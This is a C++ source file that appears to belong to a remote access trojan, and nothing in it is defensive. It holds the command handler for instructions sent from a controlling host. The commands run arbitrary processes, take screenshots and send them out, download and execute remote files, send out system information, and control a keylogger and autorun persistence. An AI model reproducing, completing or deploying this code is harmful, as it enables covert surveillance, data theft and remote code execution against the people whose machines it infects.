#include "stdafx.h"
#include "CommandExe.h"
#include "Hax.h"
#include "Keylogger.h"
#include "Installer.h"
#include "Network.h"
#include "Screenshot.h"
#include "Settings.h"
#include "Info.h"
#include "Util.h"

struct command_t {
	std::tstring name;
	std::function<void(std::vector<std::tstring>)> func;
};

command_t commandDefs[] = {
	{
		_T("batch"), [](std::vector<std::tstring> args) {
			if (!args.size())
				return;

			std::tstring fileArgs = Util::join_at_index(args, _T(" "));
			if (fileArgs.size() > _MAX_PATH-1)
			{
				Error(_T("batch: Filename too long"));
				return;
			}

			TCHAR dest[_MAX_PATH];
			_tcscpy(dest, fileArgs.c_str());

			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			ZeroMemory(&pi, sizeof(pi));
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);

			BOOL ret = CreateProcess(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
			if (!ret)
			{
				Error(_T("batch: Failed to create process"));
				return;
			}
		}
	},
	{
		_T("msgbox"), [](std::vector<std::tstring> args) {
			if (!args.size())
				return;

			std::tstring msgboxText = Util::join_at_index(args, _T(" "));
			MessageBox(NULL, msgboxText.c_str(), NULL, MB_OK);
		}
	},
	{
		_T("screenshot"), [](std::vector<std::tstring> args) {

			screenshot.TakeScreenshot(V_FAKE_TMP1);

			FILE *fp;
			errno_t error = _tfopen_s(&fp, V_FAKE_TMP1, _T("rb"));
			if (error != 0) {
				Error(_T("_tfopen failed"));
				goto g_1;
			}

			fseek(fp, 0, SEEK_END);
			size_t size = ftell(fp);
			fseek(fp, 0, SEEK_SET);


			char* buffer = (char*)malloc(size);
			if (!buffer)
			{
				Error(_T("Couldn't allocate buffer"));
				goto g_2;
			}

			if (fread_s(buffer, size, 1, size, fp) != size)
			{
				Error(_T("fread_s did not return size"));
				goto g_3;
			}

			network.SendFile(V_NET_FILE_DATA, size, buffer);

			g_3:	free(buffer);
			g_2:	fclose(fp);
			g_1:	DeleteFile(V_FAKE_TMP1);
		}
	},
	{
		_T("remove"), [](std::vector<std::tstring> args) {
			installer.SetAutorun(false);
		}
	},
	{
		_T("exit"), [](std::vector<std::tstring> args) {
			keylogger.Stop();
		}
	},
	{
		_T("exec"), [](std::vector<std::tstring> args) {

			if (args.size() < 1)
				return;

			if (args[0].size() < 1)
				return;

			const TCHAR *file_path = args[0].c_str();
			const TCHAR *file_name = PathFindFileName(file_path);
			std::string file_path_s = Util::t2s(args[0]);

			size_t resp_len;
			char *resp;

			bool nret = network.GetFile(file_path_s.c_str(), &resp_len, &resp);
			if (!nret)
			{
				return;
			}

			HANDLE hFile = CreateFile(file_name, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			if(hFile == INVALID_HANDLE_VALUE)
			{
				Error(_T("exec: Failed to create file"));
				goto g_1;
			}

			DWORD written;
			WriteFile(hFile, resp, resp_len, &written, 0);
			if (written != resp_len)
			{
				Error(_T("exec: Written differs from buffer length"));
				CloseHandle(hFile);
				goto g_2;
			}
				
			CloseHandle(hFile);


			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			ZeroMemory(&pi, sizeof(pi));
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);

			BOOL pret = CreateProcess(file_name, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
			if (!pret)
			{
				Error(_T("exec: Failed to create process"));
				goto g_2;
			}

			g_2: // DeleteFileA(file_name);
			g_1: free(resp);
		}
	},
	{
		_T("info"), [&](std::vector<std::tstring> args) {
			std::tstring osInfo = _T("i=");
			info.GetInformation(osInfo);

			std::string osInfoS = Util::t2s(osInfo);

			network.SendText(V_NET_FILE_DATA, osInfoS.c_str());
		}
	}
};

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::Run(const std::tstring& cmds)
{
	if (cmds.size() == 0) {
		return;
	}

	std::vector<std::tstring> commands = Util::split(cmds, ';');
	for (auto &cmd : commands) {
		std::vector<std::tstring> args = Util::split(cmd, ' ');
		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::tstring &s) { return std::all_of(s.begin(), s.end(), isspace); }), args.end());
		if (args.size()) {
			auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
			if (result != std::end(commandDefs)) {
				(*result).func(Util::split(Util::join_at_index(args, _T(" "), 1), ' '));
			}
		}
	}
}